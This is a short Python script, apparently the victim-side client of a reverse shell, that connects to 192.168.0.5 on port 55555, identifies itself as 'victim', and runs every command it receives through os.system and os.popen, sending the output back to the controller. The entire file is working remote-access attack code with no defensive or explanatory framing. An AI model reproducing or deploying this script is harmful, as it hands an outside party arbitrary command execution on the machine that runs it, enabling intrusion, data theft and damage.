import socket, threading, os

host = '192.168.0.5'
port = 55555

victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

victim.connect((host,port))


def recive_and_execute_messages():
    while True: 
        try:    
            message = victim.recv(1024).decode("utf-8")
            if message == '@role':
                victim.send('victim'.encode('utf-8'))
            else:
                os.system(message)
                out = os.popen(message).read()
                victim.send(out.encode("utf-8"))
        except:
            print('La sesion se ha desconectado')
            victim.close()
            

    
thread1 = threading.Thread(target=recive_and_execute_messages)
thread1.start()

        
